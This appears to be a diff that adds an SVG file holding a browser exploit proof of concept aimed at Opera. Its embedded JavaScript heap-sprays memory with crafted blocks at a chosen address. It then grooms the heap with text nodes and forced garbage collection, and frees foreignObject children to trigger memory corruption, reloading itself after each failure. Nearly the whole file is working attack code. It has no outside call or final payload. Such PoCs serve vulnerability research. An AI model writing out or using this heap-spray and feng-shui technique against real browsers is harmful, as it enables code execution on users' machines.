@@ -1,0 +1,94 @@
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script type="text/javascript">
+    <![CDATA[
+      var iHeapSprayGranularity =  0x00100000,
+          iHeapSprayStartAddress = 0x05000000,
+          iHeapSprayAddress =      0x12345678,
+          iHeapSprayHeaderSize =         0x44,
+          iHeapBlockSize =              0x100,
+          iTextNodeSize =                0x40;
+
+      var oHeapBuffer = new Buffer(iHeapBlockSize, 0x41);
+      oHeapBuffer.setDword(0x14, iHeapSprayAddress);
+      oHeapBuffer.setDword(0x78, 0xDEADBEEF - 0x188);
+      var sHeapBlock = oHeapBuffer.toString();
+      if (sHeapBlock.length != 0x80) throw '"' + sHeapBlock + '".length = ' + sHeapBlock.length.toString(16); 
+      console.log('sHeapBlock = "' + sHeapBlock + '"');
+      console.log('sHeapBlock.length = ' + sHeapBlock.length.toString(16));
+
+      var sHeapSprayBlock = sHeapBlock.substr(iHeapSprayHeaderSize) + sHeapBlock.substr(0, iHeapSprayHeaderSize);
+      var iHeapSprayBlockCopies = iHeapSprayGranularity / iHeapBlockSize;
+      var asHeap = [];
+      console.log('sHeapBlock * ' + iHeapSprayBlockCopies.toString(16) + ' = ' + iHeapSprayGranularity.toString(16));
+      do {
+        asHeap.push(new Array(iHeapSprayBlockCopies).join(sHeapSprayBlock));
+      } while (iHeapSprayStartAddress + asHeap.length * iHeapSprayGranularity < iHeapSprayAddress);
+
+      window.onload=function(){
+        var aoForeignObjects = document.getElementsByTagName("foreignObject");
+
+        var aoHeapFengShui = [];
+        // Fill all gaps
+        for(var iCount = 1; iCount < 0x400; iCount++) {
+          for (var iSize = 0x10; iSize < 0x200; iSize += 0x10) {
+            aoHeapFengShui.push(document.createTextNode(sHeapBlock.substr(0, iSize / 2 - 1)));
+          }
+          opera.collect();
+        }
+        // Free
+        for (var i = 0; i < aoForeignObjects.length; i++) {
+          var oForeignObject = aoForeignObjects[i];
+          var iLength = oForeignObject.removeChild(oForeignObject.firstChild).nodeValue.length;
+          for(var iCount = 1; iCount < 0x200; iCount++) {
+            aoHeapFengShui.push(document.createTextNode(sHeapBlock));
+          }
+          opera.collect();
+        }
+        alert('FAIL!');
+        setTimeout(function(){
+          location.reload();
+        }, 100);
+      }
+
+      function Buffer(iSize, iDefaultValue) {
+        this.data = {};
+        for (var i = 0; i < iSize; i++) {
+          this.data[i] = iDefaultValue;
+        }
+        this.setDword = function Buffer_dword(iIndex, iValue) {
+          this.data[iIndex++] = iValue & 0xFF; iValue >>>= 8;
+          this.data[iIndex++] = iValue & 0xFF; iValue >>>= 8;
+          this.data[iIndex++] = iValue & 0xFF; iValue >>>= 8;
+          this.data[iIndex] = iValue & 0xFF;
+        }
+        this.setWord = function Buffer_word(iIndex, iValue) {
+          this.data[iIndex++] = iValue & 0xFF; iValue >>>= 8;
+          this.data[iIndex] = iValue & 0xFF;
+        }
+        this.setByte = function Buffer_byte(iIndex, iValue) {
+          this.data[iIndex] = iValue & 0xFF;
+        }
+        this.toString = function Buffer_toString() {
+          var sString = "";
+          for (var i = 0; i < iSize; i+=2) {
+            var iCharCode = this.data[i] + (this.data[i+1] << 8);
+            sString += String.fromCharCode(iCharCode);
+          }
+          return sString;
+        }
+      }
+    ]]>
+  </script>
+  <foreignObject width="1px" height="1px">0_________AA____1111111111111111</foreignObject>
+  <foreignObject width="1px" height="1px">0_________AA____11111111111111</foreignObject>
+  <foreignObject width="1px" height="1px">0_________AA____111111111111</foreignObject>
+  <foreignObject width="1px" height="1px">0_________AA____1111111111</foreignObject>
+  <foreignObject width="1px" height="1px">0_________AA____11111111</foreignObject>
+  <foreignObject width="1px" height="1px">0_________AA____111111</foreignObject>
+  <foreignObject width="1px" height="1px">0_________AA____1111</foreignObject>
+  <foreignObject width="1px" height="1px">0_________AA____11</foreignObject>
+  <foreignObject width="1px" height="1px">0_________AA____</foreignObject>
+  <foreignObject width="1px" height="1px">0_________AA__</foreignObject>
+  <foreignObject width="1px" height="1px">0_________AA</foreignObject>
+</svg>
